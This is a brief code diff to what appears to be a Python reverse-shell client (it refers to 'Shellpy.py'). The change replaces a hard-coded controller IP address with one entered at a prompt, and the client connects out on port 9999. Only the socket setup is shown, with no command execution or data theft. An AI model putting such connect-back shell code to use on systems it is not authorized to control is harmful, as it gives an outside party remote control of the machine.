@@ -2,6 +2,7 @@ import os
 import socket
 import subprocess
 
+a = input("Enter your Host IP Address: ")
 
 # Create a socket
 def socket_create():
@@ -9,7 +10,7 @@ def socket_create():
         global host
         global port
         global s
-        host = '192.0.0.0'#Add host IP Address of the system in which you run Shellpy.py
+        host = a
         port = 9999
         s = socket.socket()
     except socket.error as msg:
